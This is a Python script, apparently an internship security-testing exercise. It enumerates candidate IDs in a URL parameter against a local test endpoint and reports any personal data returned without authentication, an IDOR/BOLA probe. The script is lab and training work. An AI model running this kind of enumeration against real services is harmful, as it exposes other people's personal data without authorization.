#!/usr/bin/env python3
"""
Datheon Application Security & API Pentesting Internship
Task 1: Black-Box Reconnaissance & URL Parameter Fuzzer (IDOR Discovery)
Author: Seebiraj V (DT-2026-TV82L)
Email: jeeviseebi007@gmail.com

Description:
Automated ethical security reconnaissance script simulating black-box discovery
of Broken Object Level Authorization (BOLA/IDOR) on student and candidate dashboard
endpoints. Tests whether manipulating URL query parameters (?appId=..., ?userId=...)
leaks Personally Identifiable Information (PII) without session cookies or authorization headers.
"""

import sys
import json
import urllib.request
import urllib.error
from typing import Dict, Any, List

TARGET_BASE_URL = "http://localhost:4000"

# Target candidate IDs to fuzz across tenant boundaries
CANDIDATE_PAYLOADS = [
    "DT-2026-TV82L",  # Seebiraj V (Primary candidate)
    "DT-2026-001",    # Alice Johnson (Tenant B)
    "DT-2026-002",    # Bob Miller (Tenant C)
    "DT-2026-999",    # Non-existent ID test
]

def print_banner():
    print("=" * 72)
    print("🛡️  DATHEON APPSEC - TASK 1 IDOR/BOLA RECONNAISSANCE FUZZER")
    print("🎯 Target: OWASP API1:2023 - Broken Object Level Authorization (CWE-639)")
    print("=" * 72)

def execute_raw_unauthenticated_request(endpoint: str) -> Dict[str, Any]:
    """
    Executes a stripped HTTP GET request with ZERO cookies, authentication tokens,
    or session context to verify black-box unauthenticated access.
    """
    url = f"{TARGET_BASE_URL}{endpoint}"
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "Datheon-AppSec-IDOR-Fuzzer/1.0 (Security-Audit)",
            "Accept": "application/json"
            # Explicitly omitted: Cookie, Authorization, X-API-Key
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            status_code = response.getcode()
            body = response.read().decode("utf-8")
            return {
                "url": url,
                "status": status_code,
                "data": json.loads(body),
                "error": None
            }
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8")
        try:
            parsed = json.loads(body)
        except Exception:
            parsed = body
        return {
            "url": url,
            "status": e.code,
            "data": parsed,
            "error": str(e)
        }
    except Exception as e:
        return {
            "url": url,
            "status": 0,
            "data": None,
            "error": str(e)
        }

def run_idor_audit():
    print_banner()
    print(f"[*] Commencing automated URL parameter fuzzing against {TARGET_BASE_URL}...\n")

    findings: List[Dict[str, Any]] = []

    for cid in CANDIDATE_PAYLOADS:
        query_endpoint = f"/api/vulnerable/dashboard?appId={cid}"
        print(f"[>] Testing endpoint: {query_endpoint}")
        res = execute_raw_unauthenticated_request(query_endpoint)

        if res["status"] == 200 and res["data"] and res["data"].get("success"):
            candidate_data = res["data"].get("data", {})
            full_name = candidate_data.get("fullName", "Unknown")
            email = candidate_data.get("email", "Unknown")
            phone = candidate_data.get("phone", "Unknown")
            eval_notes = candidate_data.get("evaluationNotes", "None")

            print(f"    🚨 [CRITICAL VULNERABILITY DETECTED - IDOR/BOLA]")
            print(f"    ├─ Status: HTTP 200 OK (Unauthenticated Access Confirmed)")
            print(f"    ├─ Leaked Identity: {full_name} ({email})")
            print(f"    ├─ Leaked Telephone: {phone}")
            print(f"    └─ Leaked Sensitive Notes: {eval_notes[:60]}...")
            print("-" * 72)

            findings.append({
                "candidateId": cid,
                "name": full_name,
                "email": email,
                "phone": phone,
                "evaluationNotes": eval_notes
            })
        elif res["status"] == 404:
            print(f"    ℹ️  HTTP 404 Not Found (Non-existent ID safely rejected)\n")
        elif res["status"] == 401 or res["status"] == 403:
            print(f"    🛡️  HTTP {res['status']} Blocked (Defensive authorization active)\n")
        else:
            print(f"    ⚠️  Status {res['status']}: {res['error']}\n")

    print("\n" + "=" * 72)
    print("📊 EXECUTIVE VULNERABILITY AUDIT SUMMARY")
    print("=" * 72)
    print(f"Total Target Identifiers Probed: {len(CANDIDATE_PAYLOADS)}")
    print(f"Confirmed High-Risk IDOR Leaks:   {len(findings)}")
    print("\n[!] Technical Severity Score:")
    print("    Standard: CVSS v3.1 Base Score: 7.5 (HIGH)")
    print("    Vector:   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N")
    print("=" * 72)

    return findings

if __name__ == "__main__":
    run_idor_audit()
